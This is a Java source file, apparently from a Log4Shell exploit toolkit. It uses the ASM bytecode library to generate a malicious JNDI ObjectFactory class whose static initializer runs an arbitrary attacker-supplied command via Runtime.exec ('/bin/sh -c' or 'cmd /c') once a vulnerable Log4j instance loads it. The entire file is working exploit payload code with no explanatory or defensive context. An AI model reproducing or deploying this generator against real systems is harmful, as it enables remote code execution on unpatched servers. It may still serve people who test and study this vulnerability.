package es.malvarez.log4shell.malicious.payload;

import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;

import static org.objectweb.asm.Opcodes.AASTORE;
import static org.objectweb.asm.Opcodes.ACC_PUBLIC;
import static org.objectweb.asm.Opcodes.ACC_STATIC;
import static org.objectweb.asm.Opcodes.ACC_SUPER;
import static org.objectweb.asm.Opcodes.ALOAD;
import static org.objectweb.asm.Opcodes.ANEWARRAY;
import static org.objectweb.asm.Opcodes.ARETURN;
import static org.objectweb.asm.Opcodes.ASTORE;
import static org.objectweb.asm.Opcodes.BIPUSH;
import static org.objectweb.asm.Opcodes.DUP;
import static org.objectweb.asm.Opcodes.F_APPEND;
import static org.objectweb.asm.Opcodes.F_FULL;
import static org.objectweb.asm.Opcodes.F_SAME;
import static org.objectweb.asm.Opcodes.GETSTATIC;
import static org.objectweb.asm.Opcodes.GOTO;
import static org.objectweb.asm.Opcodes.ICONST_0;
import static org.objectweb.asm.Opcodes.ICONST_1;
import static org.objectweb.asm.Opcodes.ICONST_2;
import static org.objectweb.asm.Opcodes.ICONST_3;
import static org.objectweb.asm.Opcodes.IF_ICMPNE;
import static org.objectweb.asm.Opcodes.INVOKESPECIAL;
import static org.objectweb.asm.Opcodes.INVOKESTATIC;
import static org.objectweb.asm.Opcodes.INVOKEVIRTUAL;
import static org.objectweb.asm.Opcodes.POP;
import static org.objectweb.asm.Opcodes.RETURN;
import static org.objectweb.asm.Opcodes.V1_6;

public class Log4j implements Payload {

    private final byte[] bytes;

    private final String className;

    public Log4j(final String name, final String cmd) {
        className = name;
        bytes = generate(cmd, className);
    }

    private byte[] generate(final String cmd, final String className) {
        ClassWriter classWriter = new ClassWriter(0);
        MethodVisitor methodVisitor;

        classWriter.visit(V1_6, ACC_PUBLIC + ACC_SUPER, className, null, "java/lang/Object", new String[]{"javax/naming/spi/ObjectFactory"});

        {
            methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
            methodVisitor.visitCode();
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            methodVisitor.visitInsn(RETURN);
            methodVisitor.visitMaxs(1, 1);
            methodVisitor.visitEnd();
        }

        {
            methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "getObjectInstance", "(Ljava/lang/Object;Ljavax/naming/Name;Ljavax/naming/Context;Ljava/util/Hashtable;)Ljava/lang/Object;", "(Ljava/lang/Object;Ljavax/naming/Name;Ljavax/naming/Context;Ljava/util/Hashtable<**>;)Ljava/lang/Object;", new String[]{"java/lang/Exception"});
            methodVisitor.visitCode();
            methodVisitor.visitLdcInsn("You have been owned!!!, '" + cmd + "' should have been executed by now");
            methodVisitor.visitInsn(ARETURN);
            methodVisitor.visitMaxs(1, 5);
            methodVisitor.visitEnd();
        }

        {
            methodVisitor = classWriter.visitMethod(ACC_STATIC, "<clinit>", "()V", null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            Label label1 = new Label();
            Label label2 = new Label();
            methodVisitor.visitTryCatchBlock(label0, label1, label2, "java/lang/Throwable");
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(14, label0);
            methodVisitor.visitFieldInsn(GETSTATIC, "java/io/File", "separatorChar", "C");
            methodVisitor.visitIntInsn(BIPUSH, 47);
            Label label3 = new Label();
            methodVisitor.visitJumpInsn(IF_ICMPNE, label3);
            methodVisitor.visitInsn(ICONST_3);
            methodVisitor.visitTypeInsn(ANEWARRAY, "java/lang/String");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitLdcInsn("/bin/sh");
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_1);
            methodVisitor.visitLdcInsn("-c");
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_2);
            methodVisitor.visitLdcInsn(cmd);
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitVarInsn(ASTORE, 0);
            Label label5 = new Label();
            methodVisitor.visitLabel(label5);
            Label label6 = new Label();
            methodVisitor.visitJumpInsn(GOTO, label6);
            methodVisitor.visitLabel(label3);
            methodVisitor.visitFrame(F_SAME, 0, null, 0, null);
            methodVisitor.visitInsn(ICONST_3);
            methodVisitor.visitTypeInsn(ANEWARRAY, "java/lang/String");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitLdcInsn("cmd");
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_1);
            methodVisitor.visitLdcInsn("/c");
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_2);
            methodVisitor.visitLdcInsn(cmd);
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitVarInsn(ASTORE, 0);
            methodVisitor.visitLabel(label6);
            methodVisitor.visitFrame(F_APPEND, 1, new Object[]{"[Ljava/lang/String;"}, 0, null);
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
            methodVisitor.visitInsn(POP);
            methodVisitor.visitLabel(label1);
            Label label7 = new Label();
            methodVisitor.visitJumpInsn(GOTO, label7);
            methodVisitor.visitLabel(label2);
            methodVisitor.visitFrame(F_FULL, 0, new Object[]{}, 1, new Object[]{"java/lang/Throwable"});
            methodVisitor.visitVarInsn(ASTORE, 0);
            Label label8 = new Label();
            methodVisitor.visitLabel(label8);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Throwable", "printStackTrace", "()V", false);
            methodVisitor.visitLabel(label7);
            methodVisitor.visitFrame(F_SAME, 0, null, 0, null);
            methodVisitor.visitInsn(RETURN);
            methodVisitor.visitMaxs(4, 1);
            methodVisitor.visitEnd();
        }
        classWriter.visitEnd();
        return classWriter.toByteArray();
    }

    @Override
    public String getClassName() {
        return className;
    }

    @Override
    public byte[] getBytes() {
        return bytes;
    }
}
